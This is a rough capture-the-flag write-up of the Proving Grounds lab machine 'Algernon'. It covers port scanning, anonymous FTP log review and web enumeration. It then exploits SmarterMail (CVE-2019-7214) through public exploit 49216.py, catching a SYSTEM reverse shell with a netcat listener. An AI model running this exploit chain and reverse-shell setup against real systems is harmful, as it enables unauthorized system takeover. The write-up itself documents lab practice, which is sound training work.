# Algernon (rough notes)

Initial port scan with `nmap`:

```
┌──(kali㉿kali)-[~]
└─$ nmap -v -Pn -p- -T4 algernon                    
...

PORT      STATE    SERVICE
21/tcp    open     ftp
80/tcp    open     http
135/tcp   open     msrpc
139/tcp   open     netbios-ssn
445/tcp   open     microsoft-ds
3332/tcp  filtered mcs-mailsvr
4775/tcp  filtered unknown
5040/tcp  open     unknown
9998/tcp  open     distinct32
13105/tcp filtered unknown
16422/tcp filtered unknown
17001/tcp open     unknown
26121/tcp filtered unknown
26413/tcp filtered unknown
31077/tcp filtered unknown
49664/tcp open     unknown
49665/tcp open     unknown
49666/tcp open     unknown
49667/tcp open     unknown
49668/tcp open     unknown
49669/tcp open     unknown
50555/tcp filtered unknown
```

I've never seen a Proving Grounds machine with that many open ports...

Second `nmap` run, this time with service fingerprinting:

```
┌──(kali㉿kali)-[~]
└─$ nmap -v -Pn -p 21,80,135,139,445,3332,4775,5040,9998,13105,16422,17001,26121,26413,31077,49664,49665,49666,49667,49668,49669,50555 -A algernon
...

PORT      STATE  SERVICE       VERSION
21/tcp    open   ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  09:31PM       <DIR>          ImapRetrieval
| 03-07-24  08:12PM       <DIR>          Logs
| 04-29-20  09:31PM       <DIR>          PopRetrieval
|_04-29-20  09:32PM       <DIR>          Spool
80/tcp    open   http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp   open   msrpc         Microsoft Windows RPC
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds?
3332/tcp  closed mcs-mailsvr
4775/tcp  closed unknown
5040/tcp  open   unknown
9998/tcp  open   http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 9D7294CAAB5C2DF4CD916F53653714D5
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /interface/root
| uptime-agent-info: HTTP/1.1 400 Bad Request\x0D
| Content-Type: text/html; charset=us-ascii\x0D
| Server: Microsoft-HTTPAPI/2.0\x0D
| Date: Fri, 08 Mar 2024 04:22:08 GMT\x0D
| Connection: close\x0D
| Content-Length: 326\x0D
| \x0D
| <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN""http://www.w3.org/TR/html4/strict.dtd">\x0D
| <HTML><HEAD><TITLE>Bad Request</TITLE>\x0D
| <META HTTP-EQUIV="Content-Type" Content="text/html; charset=us-ascii"></HEAD>\x0D
| <BODY><h2>Bad Request - Invalid Verb</h2>\x0D
| <hr><p>HTTP Error 400. The request verb is invalid.</p>\x0D
|_</BODY></HTML>\x0D
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Microsoft-IIS/10.0
13105/tcp closed unknown
16422/tcp closed unknown
17001/tcp open   remoting      MS .NET Remoting services
26121/tcp closed unknown
26413/tcp closed unknown
31077/tcp closed unknown
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49666/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49668/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
50555/tcp closed unknown
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2024-03-08T04:22:09
|_  start_date: N/A
```
 While that ran I also did a UDP port scan...


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -v -Pn -sU -T4 --top-ports 100 algernon
...
PORT      STATE         SERVICE
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
427/udp   open|filtered svrloc
500/udp   open|filtered isakmp
593/udp   open|filtered http-rpc-epmap
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1813/udp  open|filtered radacct
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
5060/udp  open|filtered sip
5353/udp  open|filtered zeroconf
32768/udp open|filtered omad
32771/udp open|filtered sometimes-rpc6
49190/udp open|filtered unknown
```

Okay... so we have plenty to work with... Immediately interesting are:

- The FTP server (port 21) with anonymous login allowed
- The HTTP server (port 80)
- The netbios server (port 139)
- The (?) tcp server (port 5040)
- The HTTP server (9998)

We'll focus on those for now and then come back to the `nmap` results if needed.

Let's look at the ftp server first:

I log in with username 'anomymous' and password 'idk@gmail.com' (since I was asked for an email as a password)...

```s
──(kali㉿kali)-[~]
└─$ ftp algernon
Connected to algernon.
220 Microsoft FTP Service
Name (algernon:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp>
```

```
ftp> ls
229 Entering Extended Passive Mode (|||49840|)
150 Opening ASCII mode data connection.
04-29-20  09:31PM       <DIR>          ImapRetrieval
03-07-24  08:12PM       <DIR>          Logs
04-29-20  09:31PM       <DIR>          PopRetrieval
04-29-20  09:32PM       <DIR>          Spool
```


Only the `Logs` directory has files in it. The rest are empty.

I download all the files to my local machine for closer inspection:

```
┌──(kali㉿kali)-[~/algernon]
└─$ wget -m ftp://anonymous:anonymous@algernon
...

```

Here's what some log files tell us:

- `*-delivery.log`: ClamAV (antivirus software) is running on the machine

```
┌──(kali㉿kali)-[~/algernon/algernon/Logs]
└─$ cat 2020.04.29-delivery.log 
22:31:35.613 Delivery server started at 4/29/2020 10:31:35 PM
22:31:35.692 Updating ClamAV database...
22:32:23.254 Updating the ClamAV database has completed successfully
22:32:23.254 Updating ClamAV database...
22:35:18.910 Updating the ClamAV database has completed successfully
23:15:58.747 Relay server stopped at 4/29/2020 11:15:58 PM
23:16:47.621 Delivery server started at 4/29/2020 11:16:47 PM
23:16:47.652 Updating ClamAV database...
23:18:05.980 Updating the ClamAV database has completed successfully
23:26:56.915 Relay server stopped at 4/29/2020 11:26:56 PM
```

- `*-profiler.log`: nothing...

```
┌──(kali㉿kali)-[~/algernon/algernon/Logs]
└─$ cat *-profiler.log
    (... no output ...)     
```

- `*-smtpLog.log`: nothing other than that the machine is running SMTP

```
┌──(kali㉿kali)-[~/algernon/algernon/Logs]
└─$ cat 2020.04.29-smtpLog.log 
22:31:35.551 smtp started at 4/29/2020 10:31:35 PM
23:15:58.747 smtp stopped at 4/29/2020 11:15:58 PM
23:16:47.589 smtp started at 4/29/2020 11:16:47 PM
23:26:56.915 smtp stopped at 4/29/2020 11:26:56 PM
```

- `*-smtpLog.log`: nothing other than that the machine is running XMPP

```
┌──(kali㉿kali)-[~/algernon/algernon/Logs]
└─$ cat 2020.04.29-xmppLog.log 
22:31:35.863 xmpp Started at 4/29/2020 10:31:35 PM
23:15:58.763 All Xmpp Connections terminated
23:15:58.794 xmpp Stopped at 4/29/2020 11:15:58 PM
23:16:47.746 xmpp Started at 4/29/2020 11:16:47 PM
23:26:56.962 All Xmpp Connections terminated
23:26:57.040 xmpp Stopped at 4/29/2020 11:26:57 PM
```

- `2020.05.12-administrative.log`: there's a user "admin"

```
┌──(kali㉿kali)-[~/algernon/algernon/Logs]
└─$ cat 2020.05.12-administrative.log
03:35:45.726 [192.168.118.6] User @ calling create primary system admin, username: admin
03:35:47.054 [192.168.118.6] Webmail Attempting to login user: admin
03:35:47.054 [192.168.118.6] Webmail Login successful: With user admin
03:35:55.820 [192.168.118.6] Webmail Attempting to login user: admin
03:35:55.820 [192.168.118.6] Webmail Login successful: With user admin
03:36:00.195 [192.168.118.6] User admin@ calling set setup wizard settings
03:36:08.242 [192.168.118.6] User admin@ logging out
```

There are also some `*-popLog.log` and `*-imapLog.log` but they don't tell us much...

I turn my attention to the HTTP server on port 80... I check it out on the browser:

![](./assets/microsoft-iis-server.png)

Clicking on the page takes me to some Microsoft website... so nothing to do here... I'll enumerate it.

```
┌──(kali㉿kali)-[~/algernon/algernon/Logs]
└─$ gobuster dir -u http://algernon -t 20 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://algernon
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/*checkout*           (Status: 400) [Size: 3490]
/*docroot*            (Status: 400) [Size: 3490]
/*                    (Status: 400) [Size: 3490]
/http%3A%2F%2Fwww     (Status: 400) [Size: 3490]
/http%3A              (Status: 400) [Size: 3490]
/q%26a                (Status: 400) [Size: 3490]
/**http%3a            (Status: 400) [Size: 3490]
/*http%3A             (Status: 400) [Size: 3490]
/**http%3A            (Status: 400) [Size: 3490]
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3490]
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3490]
/http%3A%2F%2Fblog    (Status: 400) [Size: 3490]
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3490]
/s%26p                (Status: 400) [Size: 3490]
/%3FRID%3D2671        (Status: 400) [Size: 3490]
/devinmoore*          (Status: 400) [Size: 3490]
/200109*              (Status: 400) [Size: 3490]
/*sa_                 (Status: 400) [Size: 3490]
/*dc_                 (Status: 400) [Size: 3490]
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3490]
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3490]
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3490]
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3490]
/http%3A%2F%2Fradar   (Status: 400) [Size: 3490]
/q%26a2               (Status: 400) [Size: 3490]
/login%3f             (Status: 400) [Size: 3490]
/Shakira%20Oral%20Fixation%201%20%26%202 (Status: 400) [Size: 3490]
/http%3A%2F%2Fjeremiahgrossman (Status: 400) [Size: 3490]
/http%3A%2F%2Fweblog  (Status: 400) [Size: 3490]
/http%3A%2F%2Fswik    (Status: 400) [Size: 3490]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

No luck... only 400s.

I will try the SMB server now...

```
┌──(kali㉿kali)-[~/algernon]
└─$ nmblookup -A algernon       
Looking up status of 192.168.181.65
No reply from 192.168.181.65
                                                                                                                                                                                        
┌──(kali㉿kali)-[~/algernon]
└─$ smbclient -L algernon -N                                           
session setup failed: NT_STATUS_ACCESS_DENIED
```

No luck there either. We move on to the server on 5040... The server hangs on the browser, and it does not reply with `nc`... Moving on to the server on port 9998.

This looks promising... a login form!

![](./assets/smarter-mail-9998.png)

I kick off path enumeration while I look for exploits for "SmarterMail".

```
┌──(kali㉿kali)-[~/algernon]
└─$ searchsploit smartermail exec
--------------------------------------------------- ---------------------------------
 Exploit Title                                     |  Path
--------------------------------------------------- ---------------------------------
SmarterMail Build 6985 - Remote Code Execution     | windows/remote/49216.py
--------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

We strike gold, there might be an RCE...

Looking at the code and reading about the exploit we find that this will only work if there is a MS .NET remoting listener on a port, typically 17001 (and there is!). See:

- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7214
- https://www.speedguide.net/port.php?port=17001&ref=benheater.com
- https://www.exploit-db.com/exploits/49216

I set up a local listener on port 80, modify the python script to use the IPs and ports I want, and run it.

```
┌──(kali㉿kali)-[~/algernon]
└─$ python3 49216.py
```

And we catch a shell as `nt authority\system`:

```
┌──(kali㉿kali)-[~/algernon]
└─$ nc -lvnp 80
listening on [any] 80 ...
connect to [192.168.45.194] from (UNKNOWN) [192.168.181.65] 49995
whoami
nt authority\system
PS C:\Windows\system32> 
```

We find our proof in the `Administrator` user's Desktop:

```
PS C:\Users\Administrator\Desktop> dir


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/29/2020   9:29 PM           1450 Microsoft Edge.lnk                                                    
-a----         3/7/2024   8:12 PM             34 proof.txt                                                             


PS C:\Users\Administrator\Desktop> cat proof.txt
be8e170253af58bc8fca8a892fbf9618
```

> Lesson of the day: `findstr` is basically `grep` for Windows